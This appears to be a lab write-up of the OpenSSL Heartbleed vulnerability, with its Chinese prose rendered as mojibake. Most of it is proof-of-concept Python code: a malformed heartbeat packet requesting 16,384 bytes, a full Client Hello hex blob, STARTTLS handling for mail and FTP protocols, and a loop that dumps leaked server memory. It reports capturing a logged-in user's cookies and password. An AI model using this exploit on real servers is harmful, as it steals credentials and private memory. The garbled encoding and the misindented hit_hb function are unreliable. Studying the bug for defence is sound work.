ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨æˆ·æ„é€ çš„æ¶æ„payloadï¼Œå¦‚æœç”¨æˆ·å¹¶æ²¡æœ‰åœ¨å¿ƒè·³åŒ…ä¸­æä¾›è¶³å¤Ÿå¤šçš„æ•°æ®ï¼Œä¼šå¯¼è‡´ä»€ä¹ˆé—®é¢˜ï¼Ÿæ¯”å¦‚plæŒ‡å‘çš„æ•°æ®å®é™…ä¸Šåªæœ‰ä¸€ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆmemcpyä¼šæŠŠè¿™æ¡SSLv3è®°å½•ä¹‹åçš„æ•°æ®â€”â€”æ— è®ºé‚£äº›æ•°æ®æ˜¯ä»€ä¹ˆâ€”â€”éƒ½å¤åˆ¶å‡ºæ¥

å¿ƒè·³åŒ…å…·ä½“ç»“æ„å¦‚ä¸‹ğŸ‘‡ğŸ»

![img](/Users/wwt13/Documents/Notes/assets/1586019902_64534789.jpg)

ç”±å‰é¢åˆ†æå¯çŸ¥opensslå¹¶ä¸ä¼šæ£€æŸ¥Payload lengthé•¿åº¦åŸŸï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å°†å…¶è®¾ç½®ä¸º`0x4000`ï¼Œè·å–åˆ°16384ä¸ªå­—èŠ‚çš„å†…å­˜æ•°æ®ï¼Œä¸‹é¢æ˜¯å®éªŒè®¾è®¡çš„ç•¸å½¢å¿ƒè·³æ¼æ´åŒ…çš„ç›¸å…³ä»£ç 

```python
# 0x18:Heartbleedæ¶ˆæ¯ç±»å‹; 0x0302:TLS1.1; 0x0003:å¿ƒè·³åŒ…é•¿åº¦
# 0x01:Heartbleed requestç±»å‹; 0x4000:payloadé•¿åº¦
hb = h2bin('18 03 02 00 03 01 40 00')
```

poc.pyå…·ä½“å®ç°æµç¨‹å¦‚ä¸‹ğŸ‘‡ğŸ»

1.  é¦–å…ˆå»ºç«‹socketè¿æ¥ï¼š

    ```python
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    print 'Connecting...'
    
    s.connect((args[0], opts.port))
    ```

2.  æ ¹æ®è¿æ¥åˆ¤æ–­åè®®ç±»å‹ï¼Œå› ä¸ºä½¿ç”¨OpenSSLåè®®çš„ä¸ä»…ä»…æœ‰httpsï¼ŒåŒæ—¶è¿˜åŒ…æ‹¬smtpï¼Œpop3ï¼Œimapç­‰åè®®

    ```python
    if opts.starttls != '':
    	print 'Sending STARTTLS Protocol Command...'
    
    if opts.starttls == 'smtp':
        s.recv(BUFSIZ)
        s.send("EHLO openssl.client.net\n")
        s.recv(BUFSIZ)
        s.send("STARTTLS\n")
        s.recv(BUFSIZ)
    
    if opts.starttls == 'pop3':
        s.recv(BUFSIZ)
        s.send("STLS\n")
        s.recv(BUFSIZ)
    
    if opts.starttls == 'imap':
        s.recv(BUFSIZ)
        s.send("STARTTLS\n")
        s.recv(BUFSIZ)
    
    if opts.starttls == 'ftp':
        s.recv(BUFSIZ)
        s.send("AUTH TLS\n")
        s.recv(BUFSIZ)
    
    if opts.starttls == 'xmpp': # TODO: This needs SASL
        s.send("<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\n")
        s.recv(BUFSIZ)
    ```

3.  å»ºç«‹æ¡æ‰‹è¿æ¥ï¼š

    ```python
    s.send(hello)
    ```

4.  æ¡æ‰‹è¿‡ç¨‹å®Œæˆåå‘é€æ„é€ æ”»å‡»payloadï¼Œæ¶æ„å¿ƒè·³åŒ…ï¼š

    ```python
    sys.stdout.flush()
    s.send(hb)
    hit_hb(s, hb)
    ```

5.  è·å–å¿ƒè·³å“åº”ï¼Œå¯¹å“åº”æ•°æ®è¿›è¡Œåˆ¤æ–­ï¼Œæ˜¯å¦å­˜åœ¨å¿ƒè„å‡ºè¡€æ¼æ´ï¼Œè¿™é‡Œçš„åˆ¤æ–­é€»è¾‘æ˜¯ï¼š

    1.  é€šè¿‡å‡½æ•°`typ, ver, pay = recvmsg(s)`è·å–å“åº”åŒ…çš„typeï¼šç±»å‹ï¼›versionï¼šç‰ˆæœ¬ï¼›payloadï¼šå¡«å……æ•°æ®

    2.  åˆ¤æ–­æ•°æ®åŒ…çš„typeç±»å‹å­—æ®µæ˜¯å¦ä¸ºåå…­è¿›åˆ¶**\x18**è½¬æ¢ä¸º10è¿›åˆ¶æ˜¯å¦ä¸º**24**ï¼Œå› ä¸º**typeç±»å‹ä¸º\x18ä¸ºå¿ƒè·³æ‰©å±•çš„æ•°æ®åŒ…**

    3.  ç¡®å®šæ˜¯å¦ä¸ºå¿ƒè·³åŒ…ä¹‹ååˆ¤æ–­åç»­payloadçš„é•¿åº¦ï¼Œå¦‚æœpayloadçš„é•¿åº¦å¤§äº3çš„è¯å³ä¸ºå­˜åœ¨å¿ƒè„å‡ºè¡€æ¼æ´ï¼Œåä¹‹åˆ™ä¸å­˜åœ¨ã€‚

        ```python
        def hit_hb(s, hb):
         	s.send(hb)
            while True:
                typ, ver, pay = recvmsg(s)
            if typ is None:
                print 'No heartbeat response received, server likely not vulnerable'
                return False
        
        	if typ == 24:
                print 'Received heartbeat response:'
                hexdump(pay)
            if len(pay) > 3:
            	print 'WARNING: server returned more data than it should - server is vulnerable!'
            else:
            	print 'Server processed malformed heartbeat, but did not return any extra data.'
            return True
        
             if typ == 21:
                print 'Received alert:'
                hexdump(pay)
                print 'Server returned error, likely not vulnerable'
                return False
        ```

client helloè¯·æ±‚æ„é€ ï¼šå…³é”®åœ¨äºè®¾ç½®å¿ƒè·³æ‹“å±•ï¼Œè®¾ç½® HeartbeatMode ä¸º peer_allowed_to_sendï¼Œä¹Ÿå°±æ˜¯æœ«å°¾çš„`0101`

```python
hello = h2bin('''
16 03 03 00  dc 01 00 00 d8 03 03 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')
```

### å®éªŒç»“æœå±•ç¤º

>   åœ¨ç”¨æˆ·ç™»å½•webserveråï¼Œpoc.pyç«‹åˆ»å°±é€šè¿‡heartbeat responseè·å–åˆ°äº†cookieä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†ç”¨æˆ·å¡«å†™çš„è´¦å·å¯†ç 

![image-20240609105626913](/Users/wwt13/Documents/Notes/assets/image-20240609105626913.png)

